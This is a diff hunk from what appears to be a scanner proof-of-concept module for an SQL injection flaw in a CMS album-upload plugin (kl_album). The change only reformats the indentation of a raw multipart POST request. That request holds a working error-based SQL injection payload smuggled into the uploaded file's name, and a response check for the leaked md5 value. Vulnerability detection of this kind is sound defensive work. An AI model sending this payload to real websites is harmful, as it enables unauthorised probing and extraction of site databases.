@@ -36,26 +36,26 @@ class Poc(ABPoc):
             payload = 'content/plugins/kl_album/kl_album_ajax_do.php'
             target = arg + payload
             raw="""POST /content/plugins/kl_album/kl_album_ajax_do.php HTTP/1.1
-                Host: www.zhangjiexiong.com
-                User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
-                Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-                Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
-                Accept-Encoding: gzip, deflate
-                X-Forwarded-For: 8.8.8.8
-                Connection: Keep-Alive
-                Content-Type: multipart/form-data; boundary=---------------------------19397961610256
-                Content-Length: 514
+Host: www.zhangjiexiong.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+X-Forwarded-For: 8.8.8.8
+Connection: Keep-Alive
+Content-Type: multipart/form-data; boundary=---------------------------19397961610256
+Content-Length: 514
 
-                -----------------------------19397961610256
-                Content-Disposition: form-data; name="Filedata"; filename="info',(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,md5(1)))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a),'','','0','0','', 0)#.jpg"
-                Content-Type: image/jpeg
+-----------------------------19397961610256
+Content-Disposition: form-data; name="Filedata"; filename="info',(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,md5(1)))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a),'','','0','0','', 0)#.jpg"
+Content-Type: image/jpeg
 
-                1
-                -----------------------------19397961610256
-                Content-Disposition: form-data; name="album"
+1
+-----------------------------19397961610256
+Content-Disposition: form-data; name="album"
 
-                111111
-                -----------------------------19397961610256--"""
+111111
+-----------------------------19397961610256--"""
             code, head, res, errcode, _ = hh.http(target, raw=raw)
             if code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
